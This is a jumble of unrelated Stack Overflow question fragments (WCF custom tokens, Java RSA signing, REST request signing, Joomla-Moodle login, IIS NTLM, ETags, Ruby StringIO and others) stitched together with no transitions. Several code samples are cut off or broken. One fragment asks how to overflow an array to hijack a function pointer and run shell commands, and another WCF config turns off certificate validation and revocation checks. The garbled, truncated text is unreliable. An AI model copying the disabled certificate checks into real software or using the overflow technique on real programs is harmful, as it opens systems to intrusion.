        return base.Channel.GenerateToken();
    }

    public PFPrincipal GenerateToken(CentralAuthToken token)
    {
        this.ChannelFactory.Endpoint.Behaviors.Remove&lt;ClientCredentials&gt;();
        this.ChannelFactory.Endpoint.Behaviors.Add(new CentralAuthCredentials(token));
        return this.GenerateToken();
    }
</code></pre>

<p>These methods are basically supposed to remove the default credentials from the endpoint and attach a new instance of my custom CentralAuthCredentials. (I grabbed this Remove/Add combo from an MSDN article somewhere).</p>

<p>In the configuration:</p>

<pre><code>    &lt;behaviors&gt;
        &lt;endpointBehaviors&gt;
            &lt;behavior name=""Server2ServerEndpointBehavior""&gt;
                &lt;clientCredentials type=""MyApp.Security.CentralAuthCredentials, MyApp""&gt;
                    &lt;clientCertificate findValue=""localhost"" x509FindType=""FindBySubjectName"" storeLocation=""CurrentUser"" storeName=""My"" /&gt;
                    &lt;serviceCertificate&gt;
                        &lt;authentication certificateValidationMode=""None"" revocationMode=""NoCheck"" /&gt;
                    &lt;/serviceCertificate&gt;
                &lt;/clientCredentials&gt;
            &lt;/behavior&gt;
        &lt;/endpointBehaviors&gt;
    &lt;/behaviors&gt;

    &lt;bindings&gt;
        &lt;wsHttpBinding&gt;
            &lt;binding name=""wsHttpServer2Server""&gt;
                &lt;security mode=""Message""&gt;
                    &lt;message clientCredentialType=""UserName"" /&gt;
                &lt;/security&gt;
            &lt;/binding&gt;
        &lt;/wsHttpBinding&gt;
    &lt;/bindings&gt;
</code></pre>

<p>Note that the behavior's clientCredentials type is set to my custom client credentials. However, at the moment I still have the binding's clientCredentialType set to ""UserName"". This brings up my <strong>2nd question</strong>: What the heck should clientCredentialType=""?"" be set to if I'm using custom credentials? According to MSDN, the available values for <em>Message</em> security are: <em>None</em>, <em>Windows</em>, <em>UserName</em>, <em>Certificate</em>, and <em>IssuedToken</em>.</p>

<p>Any ideas? Hopefully I'm just missing something simple?  There are like 6 more classes to the entire implementation, but I tried to only include the bits needed to understand the situation...</p>

<hr>

<p><strong>UPDATE #1:</strong></p>

<p>I've been working on this all day, and thanks to a few sources, I realized that part of what I was missing was the very last step on <a href=""http://msdn.microsoft.com/en-us/library/ms731872.aspx"" rel=""noreferrer"">this page</a>, which is adding the TokenParameters to the binding, so that the binding knows what the token looks like. That is the answer to my original 1st question; ""what the heck sets up the token requirements?"" Answer: the TokenParameters assigned to the binding.</p>

<p>So now I added the following extension which sets the TokenParameters on the binding:</p>

<pre><code>public sealed class CentralAuthTokenBindingExtension : BindingElementExtensionElement
{
    public CentralAuthTokenBindingExtension()
        : base()
    {
    }

    public override Type BindingElementType
    {
        get { return typeof(SymmetricSecurityBindingElement); }
    }

    protected override System.ServiceModel.Channels.BindingElement CreateBindingElement()
    {
        X509SecurityTokenParameters protectionParams = new X509SecurityTokenParameters();
        protectionParams.InclusionMode = SecurityTokenInclusionMode.Never;

        SymmetricSecurityBindingElement innerBindingElement = new SymmetricSecurityBindingElement();
        innerBindingElement.EndpointSupportingTokenParameters.SignedEncrypted.Add(new CentralAuthTokenParameters());
        //innerBindingElement.MessageProtectionOrder = MessageProtectionOrder.SignBeforeEncrypt;
        innerBindingElement.ProtectionTokenParameters = protectionParams;

        return innerBindingElement;
    }
}

    &lt;extensions&gt;
        &lt;bindingElementExtensions&gt;
            &lt;add name=""CentralAuthCreds"" type=""MyApp.Security.Configuration.CentralAuthTokenBindingExtension, MyApp, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"" /&gt;
        &lt;/bindingElementExtensions&gt;
    &lt;/extensions&gt;

    &lt;bindings&gt;
        &lt;customBinding&gt;
            &lt;binding name=""wsHttpServer2Server""&gt;
                &lt;CentralAuthCreds /&gt;
                &lt;binaryMessageEncoding /&gt;
                &lt;httpTransport /&gt;
            &lt;/binding&gt;
        &lt;/customBinding&gt;
    &lt;/bindings&gt;
</code></pre>

<p>Well that gets me a step further. Now I get a new exception on the server: </p>

<pre><code>""The security token manager cannot create a token authenticator for requirement ...""
</code></pre>

<p>It looks like WCF is using some default token manager to try to deal with my custom token, instead of my custom token handler (my custom token handler's constructor is never called).  I <em>think</em> this is happening because for the <em>client</em>, I have this config:</p>

<pre><code>&lt;endpointBehaviors&gt;
    &lt;behavior name=""Server2ServerEndpointBehavior""&gt;
        &lt;clientCredentials type=""MyApp.Security.CentralAuthCredentials, MyApp""&gt;
</code></pre>

<p>But on the <em>server</em> I don't have any equivalent to let it know about the custom client credentials. So, <strong>new question</strong>: Where in the config for the server do I tell it what the custom ClientCredentials are?</p>

<hr>

<p><strong>Update #2:</strong></p>

<p>Well, I finally figured out a bit more of the puzzle.  I had only implemented a ClientCredentials implementation, thinking that the client sends creds, and thats it. The client doesnt authenticate the service, so I don't need custom ServiceCredentials.  Well, I was wrong. The specified ServiceCredentials authenticates the token from the ClientCredentials, and vice-versa. So I just had to add a custom ServiceCredentials implementation that passed the same TokenSerializer and TokenAuthenticator classes.</p>

<p>On to the next issue: WCF is now ignoring my x509 certs specified in config that were working fine with UserName auth.  I'm going to open a whole new question for this one!</p>

If I compute an SHA1 message digest, and then encrypt that digest using RSA, I get a different result to asking the <em>Signature</em> class to sign the same thing:</p>

<pre><code>// Generate new key
KeyPair keyPair = KeyPairGenerator.getInstance(""RSA"").generateKeyPair();
PrivateKey privateKey = keyPair.getPrivate();
String plaintext = ""This is the message being signed"";

// Compute signature
Signature instance = Signature.getInstance(""SHA1withRSA"");

byte[] signature = instance.sign();

// Compute digest
MessageDigest sha1 = MessageDigest.getInstance(""SHA1"");
byte[] digest = sha1.digest((plaintext).getBytes());

// Encrypt digest

<p>Results in (for example):</p>

<blockquote>

  Signature: 7177c74bbbb871cc0af92e30d2808ebae146f25d3fd8ba1622...</p>
</blockquote>

<p>I must have a fundamental misunderstanding of what <em>Signature</em> is doing - I've traced through it, and it appears to be calling update on a <em>MessageDigest</em> object, with the algorithm set to SHA1 as I would expect, then getting the digest, then doing the encryption. What's making the results differ?</p>

<p><strong>EDIT:</strong></p>

<p>Leonidas made me check whether the signature scheme is supposed to do what I think it does. There are two types of signature defined in the <a href=""http://www.apps.ietf.org/rfc/rfc3447.html"" rel=""noreferrer"">RFC</a>:</p>

<ul>
<li><a href=""http://www.apps.ietf.org/rfc/rfc3447.html#sec-9.2"" rel=""noreferrer"">RSASSA-PKCS1-v1_5</a></li>
<li><a href=""http://www.apps.ietf.org/rfc/rfc3447.html#sec-9.1"" rel=""noreferrer"">RSASSA-PSS</a></li>
</ul>

<p>The <a href=""http://www.apps.ietf.org/rfc/rfc3447.html#sec-9.2"" rel=""noreferrer"">first of these</a> (PKCS1) is the one I describe above. It uses a hash function to create a digest, and then encrypts the result with a private key.</p>

<p>The <a href=""http://www.apps.ietf.org/rfc/rfc3447.html#sec-9.1"" rel=""noreferrer"">second algorithm</a> uses a random salt value, and is more secure but non-deterministic. The signature produced from the code above does not change if the same key is used repeatedly, so I don't think it can be PSS.</p>

<p><strong>EDIT:</strong></p>

<p>Here's the <code>bytes2string</code> method I was using:</p>

<pre><code>private static String bytes2String(byte[] bytes) {
    StringBuilder string = new StringBuilder();
    for (byte b : bytes) {
        String hexString = Integer.toHexString(0x00FF &amp; b);
        string.append(hexString.length() == 1 ? ""0"" + hexString : hexString);
    }
    return string.toString();
}

<p>I'm designing the authentication scheme for a REST web service. This doesn't ""really"" need to be secure (it's more of a personal project) but I want to make it as secure as possible as an exercise/learning experience. I don't want to use SSL since I don't want the hassle and, mostly, the expense of setting it up.</p>

<p>These SO questions were especially useful to get me started:</p>

<ul>
<li><a href=""https://stackoverflow.com/questions/319530/restful-authentication"">RESTful Authentication</a></li>
<li><a href=""https://stackoverflow.com/questions/7551/best-practices-for-securing-a-rest-api-web-service"">Best Practices for securing a REST API / web service</a></li>

</ul>

<p>I'm thinking of using a simplified version of <a href=""http://docs.amazonwebservices.com/AmazonS3/2006-03-01/index.html?RESTAuthentication.html"" rel=""noreferrer"">Amazon S3's authentication</a> (I like <a href=""http://oauth.net/"" rel=""noreferrer"">OAuth</a> but it seems too complicated for my needs). I'm adding a randomly generated <a href=""http://en.wikipedia.org/wiki/Cryptographic_nonce"" rel=""noreferrer"">nonce</a>, supplied by the server, to the request, to prevent replay attacks.</p>

<p>To get to the question: </p>

<p>Both S3 and OAuth rely on signing the request URL along with a few selected headers. <strong>Neither of them sign the request body</strong> for POST or PUT requests. Isn't this vulnerable to a man-in-the-middle attack, which keeps the url and headers and replaces the request body with any data the attacker wants?</p>

<p>It seems like I can guard against this by including a hash of the request body in the string that gets signed. Is this secure?</p>

<p>This is a web interface so I already know that I need to check the incoming post/get for permissions and handle errors there anyway.  I'm primarily talking about how to handle the UI.</p>

<p>Examples:</p>

<ol>
<li><p>I have a New page that allows a user to create a new Event.  Events can be master events or subevents.  Creating a master event requires ""EditMasterEvent"" privilege, while creating a subevent requires only ""EditEvent"" privilege.  I have a drop down that allows one to choose an existing event as the parent (master event) or no parent (this is a master event).  Should the ""Create Master Event"" choice be shown on the dropdown or omitted if the user only has ""EditEvent"" privileges.</p></li>
<li><p>Deleting events requires that you be an application administrator or have the appropriate edit permission for the event type.  In the latter case, the event must also be more than 5 years old.  Deleting an event causes major cascading deletes of related data in the system and for legal reasons this data must be kept for at least 5 years after the event.  Since this operation is rare for the normal user, the typical case is that the action is not available.  Should it be shown always or only when actually possible?</p></li>

I have configured the Moodle server to base its authentication on the users table on the Joomla site, so we have an authoritative source of user information.</p>

<p>What I'd like to do is this: after someone signs in to the Joomla site, provide a link to the Moodle site which will silently log them in, kind of faking a single-sign-on solution. The passwords in Joomla are MD5'd and each has its own secret salt.</p>

<p>The first thought at how to tackle this was to tell Moodle that the passwords were being stored in plain text, then via a hidden form input, send the encrypted password when they click the link. Aside from the obvious security issues with that, it also meant that should they try to log in via the Moodle interface, they'd need to enter a giant MD5 string, since that's what Moodle thinks their password is.</p>

<p>I've been considering changing the authentication module in Moodle so that if the submitted password matches certain criteria (eg: it's 32 hex characters), then don't MD5 it before comparing to the Joomla version - the problem with that is that anyone could (upon discovering the encrypted password) then use that to log in. What I need is some special way to send the encrypted password from Joomla to Moodle and to signal to Moodle to treat that login request differently.</p>

<p>Any thoughts?</p>

With Adobe Kuler, you can chose a base color and it will suggest 5 colors, including your color, that go well with one another. You can, of course, modify the colors it chooses. Also,one of the main features I use, is the image color matching. You can upload an image and it will determine a color scheme based on the colors of the image.

<p>The question is the following:</p>

<pre><code>int i,n;

void confused()
{
    printf(""who called me"");
    exit(0);
}

void shell_call(char *c)
{

    victim_func();
    printf(""Done, thank you\n"");

}
</code></pre>

<p>Ok, so I managed to get the first question correctly, which is to arbitrarily call one of the two functions not explicitly called in the main path. By the way, this has to be done while running the program without any modifications.
I did this by running the program, setting <code>N</code> to <code>7</code>, which gets me to the Function Pointer of the <code>victim_func</code> frame, I write <code>a[7]</code> with the memory address of confused or <code>shell_call</code>, and it works. (I have a 64 bit machine, thats why I have to get it to 7, since the EBI pointer is 2 ints wide, instead of 1)</p>

<p>My question is the following, how could I control which argument gets passed to the <code>shell_code</code> funcion? ie. how do I write a <code>string</code> to <code>char* c</code>.
The whole point is executing unix commands like <strong>ps</strong> etc, by running only the program.</p>

<p>I figured writing the EBI pointer with the hex representation of <strong>ps</strong> and setting the arg list of <code>shell_call</code> to that, but that didn't work. I also tried inputing <code>argsv</code> arguments and setting the arg list of <code>shell_call</code> to the <code>arg_list</code> of main, but didn't work either. </p>

<p>I think the second version should work, but I believe I'm not setting the arg list of the new stack frame correctly ( I did it by writing <code>a[8]</code> to <code>0</code>, since its the first part of the function pointer, and writing <code>a[9]=736c</code> and <code>a[10]=0000</code>, but its probably not right since those are the parameters of <code>victim_func</code>. So how do I access the parameters of <code>shell_call</code>? </p>

<p>The target application is on OSX and seems to have been compiled using gcc 3+. I can see the listing of functions implemented in the binary and have debugged and isolated one particular function which I would like to remotely call.</p>

<p>Specifically, I would like to call this function - let's call it void <code>zoomByFactor(x,y)</code> - when I receive certain data from a complex HIDevice.</p>

<p>I can easily modify or inject instructions into the binary file itself (ie. the patching does not need to occur only in RAM).</p>

<p>What would you recommend as a way of ""nicely"" doing this?</p>

<p>I do indeed need to entire application. So I can't ditch it and use a library. (For those who need an ethical explanation: this is a proprietary piece of CAD software whose company website hasn't been updated since 2006. I have paid for this product (quite a lot of money for what it is, really) and have project data which I can not easily migrate away from it. The product suits me just fine as it is, but I want to use a new HID which I recently got. I've examined the internals of the application, and I'm fairly confident that I can call the correct function with the relevant data and get it to work properly).</p>

<p>Here's what I've done so far, and it is quite gheto.</p>

cat binary.hex | awk 'substitute work' > modified.hex
xxd -r modified.hex > newbinary
chmod 777 newbinary

<p>I'm doing this kind of jumping through hoops because the binary is almost 100 megs large.</p>

<p>The jist of what I'm thinking is that I'd jmp somewhere in the main application loop, launch a thread, and return to the main function. </p>

<p>Now, the questions are: where can I insert the new code? do I need to modify symbol tables? alternatively, how could I make a dylib load automatically so that the only ""hacking"" I need to do is inserting a call to a normally loaded dylib into the main function?</p>

The application is likely to have many users, each of whom could be assigned a certain role; some of these users could be permitted to perform specific tasks outside the role.</p>

<p>I can think of two ways to design this: one, with a ""permissions"" table with a row for every user, and boolean columns, one for each task, that assign them permissions to perform those tasks. Like this:</p>

<pre>
User ID          Manage Users     Manage Products     Manage Promotions     Manage Orders
1                true             true                true                  true

3                false            false               false                 true
</pre>

<p>Another way I thought of was to use a bit mask to store these user permissions. This would limit the number of tasks that could be managed to 31 for a 32-bit signed integer, but in practice we're unlikely to have more than 31 specific tasks that a user could perform. This way, the database schema would be simpler, and we wouldn't have to change the table structure every time we added a new task that would need access control. Like this: </p>

<pre>
User ID          Permissions (8-bit mask), would be ints in table
1                00001111
2                00000111
3                00000001

As far as I know, the key is some combination of the model class type, the app id, and the object instance id, so they could probably derive the key from the id if they wanted to.</p>

<p>Any other ideas?  Jeff wrote <a href=""http://www.codinghorror.com/blog/archives/001171.html"" rel=""noreferrer"">a post about this</a>, and suggested a couple methods - a hidden form value that would change on each request, and a cookie value written via js to the form.  I won't want to exclude non-javascript users, so the cookie solution is no good - for the hidden form value, I would have to do a datastore write on every request that displayed a deletable object - not an ideal situation for a scalable app!</p>

<p>Any other ideas out there?</p>

<p>For example, let's say I want to provide a JavaScript API for end users to let them define event handlers to be run when ""interesting events"" happen, but I don't want those users to access the properties and functions of the <code>window</code> object. Am I able to do this? </p>

<p>In the simplest case, let's say I want to prevent users calling <code>alert</code>. A couple of approaches I can think of are:</p>

<ul>
<li>Redefine <code>window.alert</code> globally. I don't think this would be a valid approach because other code running in the page (i.e. stuff not authored by users in their event handlers) might want to use <code>alert</code>.</li>
<li>Send the event handler code to the server to process. I'm not sure that sending the code to the server to process is the right approach because the event handlers need to run in the context of the page. </li>
</ul>

<p>Perhaps a solution where the server processes the user defined function and then generates a callback to be executed on the client would work? Even if that approach works are there better ways to solve this problem?</p>

<p>If this page is accessed in Internet Explorer with the ""Use SSL 2.0"" option turned off, the browser returns back an error as if it can't establish a connection.

In <code>Application_AuthenticateRequest()</code>, I use <code>HttpContext.Current.User.Identity</code> to get the current <code>WindowsPrincipal</code> of the user of my website.</p>

<p>Now here's the funny part.  Some of our users have recently gotten married, and their names change.   (i.e. the user's NT Login changes from <code>jsmith</code> to <code>jjones</code>) and when my application authenticates them, IIS passes me their OLD LOGIN .  I continue to see <code>jsmith</code> passed to my application until I reboot my SERVER!  Logging off the client does not work.  Restarting the app pool does not work.  Only a full reboot.  </p>

<p>Does anyone know what's going on here?  Is there some sort of command I can use to flush whatever cache is giving me this problem?  Is my server misconfigured?</p>

<hr>

<p><strong>Follow up (for posterity):</strong></p>

<p>Grhm's answer was spot-on.  This problem pops up in low-volume servers where you don't have a lot of people using your applications, but enough requests are made to keep the users' identity in the cache.  The key part of the <a href=""http://support.microsoft.com/kb/946358"" rel=""noreferrer"">KB</a> which seems to describe why the cache item is not refreshed after the default of 10 minutes is:</p>

<blockquote>
  <p>The cache entries do time out, however chances are that recurring
  queries by applications keep the existing cache entry alive for the
  maximum lifetime of the cache entry.</p>
</blockquote>

<p>I'm not exactly sure what in our code was causing this (the recurring queries), but the resolution which worked for us was to cut the <code>LsaLookupCacheExpireTime</code> value from the seemingly obscene default of 1 week to just a few hours.  This, for us, cut the probability that a user would be impacted in the real world to essentially zero, and yet at the same time doesn't cause an extreme number of SID-Name lookups against our directory servers.  An even better solution IMO would be if applications looked up user information by SID instead of mapping user data to textual login name.  (Take note, vendors!  If you're relying on AD authentication in your application, you'll want to put the SID in your authentication database!)</p>

<p><strong>Is there any prior art for capturing a signature, specifically inside a web page running inside a mobile web browser, across a wide variety of mobile devices/web browsers?</strong>  I am only asking for in-browser solutions, not thick-clients.</p>

<p>For obvious reasons, the device would be required to have a touchscreen.</p>

<p>Certainly there are many, many different mobile browsers out there with a wide variety of capabilities.  The ideal solution would support as many browsers as possible and degrade gracefully based on browser capabilities.</p>

<p>I am already aware that certain versions of Flash might provide the drawing APIs needed for something like this, assuming the desired device's browser supports Flash.</p>

<p>I'm also aware of <a href=""http://www.bennet-tec.com/btproducts/WebSignature"" rel=""noreferrer"">a third party ActiveX/OCX control for Pocket IE</a> on Windows Mobile devices.  It is necessary for the user to manually download/install the control within the browser before use.  Unfortunate, but acceptable.</p>

<p>I'm not personally aware of many mobile browsers that support hosting a Java applet, but there are probably some.  Again, based on the support for various Java APIs, perhaps this would be a possible avenue.</p>

<p>Javascript <em>could</em> do this, if the engine and processor are robust enough on the device.</p>

<p>Finally, total pipe-dream here, perhaps one could have the user take a picture of a signature using the mobile device's camera on a plain piece of paper and somehow count that as a valid signature.  However, this would produce a bitmap image, as opposed to vectors which I'd likely be collecting in all other instances.  Also, it would be pretty difficult, if not impossible/unreasonable, to integrate the taking of the photo via a camera app and upload that using the web browser app while associating that specific image with the rest of the data being captured.</p>

<p>Now that is really the only calculations that ill be doing. I have tried using Matt McCutchen's BigInteger Library, but I am getting a lot of compiler errors during linking, such as:</p>

<p>then I get those errors.</p>

<p>Derek, I thought that by including the <code>BigIntegerLibrary.hh</code> file, that the compiler would go through and compile all the necessary files that it will use.</p>

Think of it as a page from a site that sells one item for one price where you type in your credit card info to be submitted to a payment gateway on an external site for the express purpose of charging your card one time.</p>

This would be very easy if we could use the IIS integrated security. However we can't do this. We don't have a trust to the domain controller of the customer. ANd we want to website to be available to the general internet. Only when people are connecting from within the clients network they should automatically login.</p>

<p>What we have is a list of domain accounts and a way to query the DC via LDAP in asp.net code. When anonymous access is allowed in IIS, IIS never challenges the browser for credentials. And thus our application never gets the users credentials.</p>

<p>Is there a way to force the browser into sending the credentials (and thus be able to use single sign-on) with IIS accepting anonymous request.</p>

<p><strong>Update:</strong> </p>

<p>I tried sending 401: unauthorized, www-authenticate: NTLM headers by myself. What happens next (as Fiddler tells me) is that IIS takes complete control and handles the complete chain of request. As I understand from various sources is that IIS takes the username, sends a challenge back to the browser. The browser returns with encrypted reponse and IIS connects to the domain controller to authenticate the user with this response.</p>

<p>However in my scenario IIS is in a different windows domain than the clients and have no way to authenticate the users. For that reason building a seperate site with windows authenticaion enabaled isn't going to work either.</p>

<p>For now I have to options left which I'm researching:</p>

<ol>
<li>Creating a domain trust between our hosting domain and the clients domain (our IT department isn'tto happy with this)</li>
<li>Using a NTML proxy to forward the IIS authentication requests to the clients domain controller (we have a VPN connection available to connect via LDAP) </li>

<p>Thank you for your reply. I just ran your code and it looks like PHP runs as user _www. I then tried chowning the database to be owned by _www, but that didn't work either.</p>

<p>I should also note that PDO's errorInfo function doesn't indicate an error took place. Could this be a setting with PDO somehow opening the database for read-only?

However, I am wondering when the best time to sanitize input is. For example, do you blindly store user input and then sanitize it whenever it is accessed/used, or do you sanitize the input immediately and then store this ""cleaned"" version? Maybe there are also some other approaches I haven't though of in addition to these. I am leaning more towards the first method, because any data that came from user input must still be approached cautiously, where the ""cleaned"" data might still unknowingly or accidentally be dangerous. Either way, what method do people think is best, and for what reasons?</p>

<p>My handler calculates and sets an entity-tag (using the SetETag method on the HttpCachePolicy associated with the current response object).

If I set it to private the e-tag header will be suppressed.</p>

<p>Maybe I just haven't looked hard enough but I haven't seen anything in the HTTP/1.1 spec that would justify this behavior. Why wouldn't you want to send E-Tag to browsers while still prohibiting proxies from storing the data?</p>

<pre>
Cache-Control: public
Content-Type: text/plain; charset=utf-8

<p>I've run this on the ASP.NET development server and IIS6 so far with the same results. Also I'm unable to explicitly set the ETag using</p>

<pre><code>Response.AppendHeader(""ETag"", ""static"")
</code></pre>

<p><strong>Update</strong>: It's possible to append the ETag header manually when running in IIS7, I suspect this is caused by the tight integration between ASP.NET and the IIS7 pipeline.</p>

<p><strong>Clarification</strong>: It's a long question but the core question is this: <strong>why does ASP.NET do this, how can I get around it and should I?</strong></p>

<p><strong>Update</strong>: I'm going to accept <a href=""https://stackoverflow.com/questions/32824/why-does-httpcacheabilityprivate-suppress-etags#34004"">Tony's answer</a> since it's essentially correct (go Tony!). I found that if you want to emulate the HttpCacheability.Private fully you can set the cacheability to ServerAndPrivate but you also have call cache.<a href=""http://msdn.microsoft.com/en-us/library/system.web.httpcachepolicy.setomitvarystar.aspx"" rel=""nofollow noreferrer"">SetOmitVaryStar</a>(true) otherwise the cache will add the <strong>Vary: *</strong> header to the output and you don't want that. I'll edit that into the answer when I get edit permissions (or if you see this Tony perhaps you could edit your answer to include that call?)</p>

<p>I went with the <a href=""http://jcifs.samba.org/"" rel=""nofollow noreferrer"">JCIFS library from samba.org.</a></p>

<p>Note: </p>

<ul>
<li>The solution needs to handle XML
data sources that use character
encodings other than UTF-8, e.g. by
specifying the character encoding at
the XML document declaration. Not
mangling the character encoding of
the source while stripping invalid
hexadecimal characters has been a
major sticking point.</li>
<li>The removal of invalid hexadecimal characters should only remove hexadecimal encoded values, as you can often find href values in data that happens to contains a string that would be a string match for a hexadecimal character.</li>
</ul>

<p><em>Background:</em></p>

<p>I need to consume an XML-based data source that conforms to a specific format (think Atom or RSS feeds), but want to be able to consume data sources that have been published which contain invalid hexadecimal characters per the XML specification.</p>

<p>In .NET if you have a Stream that represents the XML data source, and then attempt to parse it using an XmlReader and/or XPathDocument, an exception is raised due to the inclusion of invalid hexadecimal characters in the XML data. My current attempt to resolve this issue is to parse the Stream as a string and use a regular expression to remove and/or replace the invalid hexadecimal characters, but I am looking for a more performant solution.</p>

<p>Any thoughts?</p>

<hr>

<p>dp: You are right that I missed a check in Equals, I have updated it.  Using the existing hashcode from the byte array will result in reference equality (or at least that same concept translated to hashcodes).
for example:</p>

<pre><code>byte[] b1 = new byte[] { 1 };
byte[] b2 = new byte[] { 1 };
int h1 = b1.GetHashCode();
int h2 = b2.GetHashCode();
</code></pre>

<p>With that code, despite the two byte arrays having the same values within them, they are referring to different parts of memory and will result in (probably) different hash codes. I need the hash codes for two byte arrays with the same contents to be equal.</p>

What the author doesn't mention, though, is that <code>StringIO</code> is just an ""I.""  There's no ""O.""  You <em>can't</em> do this, for example:</p>

<pre><code>s = StringIO.new
s &lt;&lt; 'foo'
s &lt;&lt; 'bar'
s.to_s
# =&gt; should be ""foo\nbar""
# =&gt; really is ''`
</code></pre>

<p>Ruby really needs a StringBuffer just like the one Java has. StringBuffers serve two important purposes. First, they let you test the output half of what Ruby's StringIO does. Second, they are useful for building up long strings from small parts -- something that Joel reminds us over and over again is otherwise very very slow.</p>

<p>Is there a good replacement?</p>

<p>It's true that Strings in Ruby are mutable, but that doesn't mean we should always rely on that functionality.  If <code>stuff</code> is large, the performance and memory requirements of this, for example, is really bad.</p>

<pre><code>result = stuff.map(&amp;:to_s).join(' ')
</code></pre>

<p>The ""correct"" way to do this in Java is:</p>

<pre><code>result = StringBuffer.new("""")
for(String s : stuff) {
  result.append(s);
}
</code></pre>

<p>Though my Java is a bit rusty.</p>

I would like a good solution that does not require me to know the carrier. Barring that, is there an easy way to lookup carrier given a cell phone number?</p>

<p>I understand that there are some services independent of the major mobile carriers that offer a per-message fee-based service, with API. What I would like to know is how such organizations tap into the SMS networks. Do they have contracts with mobile carriers to resell their services?</p>

To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.</p>

<p>This works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.</p>

<p>My initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?</p>

<p>Apart from testing between various compiler flags (I've compared 32-bit against 64-bit too because the optimizations are different), I've also tried switching the order of the tests around. But still, the <code>atan2(0, -1)</code> version still comes out on top every time.</p>
